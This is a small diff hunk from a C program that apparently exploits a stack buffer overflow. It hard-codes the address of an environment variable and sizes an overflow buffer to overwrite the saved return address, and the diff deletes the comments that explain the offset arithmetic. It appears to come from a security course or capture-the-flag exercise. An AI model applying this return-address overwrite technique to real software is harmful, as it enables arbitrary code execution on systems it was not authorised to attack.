@@ -19,8 +19,6 @@ int main(void)
   int j = 0;
   char envAddress[] = "\xb8\xdf\xbf\xff";
   int overflowLength = 169;
-  // The difference between the start of the buffer and the spot where the return address is stored is 176 bytes. We're 7 bytes already in so we need to make the overflow length 169.
-  // We make our overflow length 174 so that we have room at the end for the 4-byte address of the env variable, with an extra byte for the null terminator.
   char overflow[174];
 
   for (j = 0; j < overflowLength; j++)
